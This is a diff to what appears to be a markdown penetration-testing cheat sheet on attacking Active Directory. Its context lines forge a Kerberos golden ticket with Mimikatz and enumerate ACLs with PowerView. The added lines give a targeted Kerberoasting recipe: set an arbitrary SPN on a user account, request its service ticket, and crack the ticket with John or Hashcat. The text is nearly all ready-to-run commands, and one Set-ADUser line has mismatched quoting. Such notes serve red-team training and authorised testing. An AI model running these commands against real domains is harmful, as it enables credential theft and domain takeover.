@@ -617,6 +617,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Lets enumerate the permissions for RDPUsers on ACLs using PowerView
   - `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
 - Using Powerview, see if the user already has a SPN. 
-  - `Get-DomainUser -Identity supportuser | select serviceprincipalname`
+  - `Get-DomainUser -Identity <USERNAME> | select serviceprincipalname`
  - Using ActiveDirectory module.
-  - `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
+  - `Get-ADUser -Identity <USERNAME> -Properties ServicePrincipalName | select ServicePrincipalName`
+- Set a SPN for the user (must be unique for the domain)
+  - `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
+- Using ActiveDirectory Module.
+  - `Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Add='ops/whatever1`}
+- Request a ticket
+  - `Add-Type -AssemblyName System.IdentityModel`
+  - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"`
+- `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat
